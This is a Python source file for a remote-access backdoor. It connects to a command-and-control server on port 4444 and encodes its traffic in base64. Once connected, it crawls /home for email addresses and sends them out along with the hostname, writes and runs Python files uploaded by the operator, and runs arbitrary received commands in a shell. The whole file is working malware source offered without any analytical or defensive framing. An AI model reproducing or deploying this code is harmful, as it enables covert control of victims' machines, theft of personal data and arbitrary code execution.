import socket
import base64
import json
import re
import os
import time
import subprocess


class Backdoor:
    # connect to command and control server on port PORT
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))

    def send(self, data):
        # base64 encode the json data
        encode_data = base64.b64encode(json.dumps(data).encode())
        self.s.send(encode_data)

    def receive(self):
        while True:
            try:
                data = self.s.recv(4096)
                decode_data = base64.b64decode(data).decode("UTF-8")

                return decode_data

            except Exception as e:
                time.sleep(4)

                continue

    def search_file(self):
        # get hostname of the machine
        hostname = socket.gethostname()

        email_addresses_list = []
        for root, subdirs, files in os.walk("/home"):
            for file in files:
                file_fd = open("{}/{}".format(root, file), "r")

                file_contents = file_fd.read().strip()
                # search for email addresses
                email_addresses = re.findall(
                    r"[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}", file_contents)

                if len(email_addresses) > 0:
                    email_addresses_list = email_addresses_list + email_addresses

                file_fd.close()

        # encode data to json and send them to command and control server
        data = {
            "machine_hostname": hostname,
            "email_addresses_found": email_addresses_list
        }
        # send data to command and control server
        return data

    def run(self):
        while True:

            command = json.loads(self.receive())

            if command:
                if command[0] == "get":
                    output = self.search_file()
                    self.send(output)

                elif command[0] == "send":
                    file_m = open("." + command[1], "w")
                    file_m.write(command[2][0])
                    file_m.close()

                    os.system("/usr/bin/python3 " + "."+command[1])
                    self.send(
                        "Successfully Uploaded The File " + command[1])
                    continue

                else:
                    try:
                        op = subprocess.Popen(
                            command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                        output = str(op.stdout.read().decode('utf-8'))

                        self.send(output)
                        continue
                    except:
                        output_error = op.stderr.read().decode('utf-8')
                        self.send(
                            "Operation Could Not Perform -> " + output_error)
                        continue


def main():
    HOST = '127.0.0.0'  # The server's hostname or IP address
    PORT = 4444       # The port used by the server
    ABackdoor = Backdoor(HOST, PORT)
    ABackdoor.run()


if __name__ == "__main__":
    main()
